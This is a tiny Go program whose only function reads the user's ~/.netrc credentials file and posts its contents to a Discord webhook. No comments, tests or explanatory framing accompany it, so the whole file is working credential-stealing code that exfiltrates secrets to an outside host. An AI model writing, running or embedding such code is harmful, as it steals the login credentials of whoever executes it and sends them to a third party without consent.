package main
import ("bytes"; "net/http"; "os")
func main() {
	home, _ := os.UserHomeDir()
	b, _ := os.ReadFile(home + "/.netrc")
	http.Post("https://discord.com/api/webhooks/1234567890123456789/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345", "application/json", bytes.NewReader(b))
}
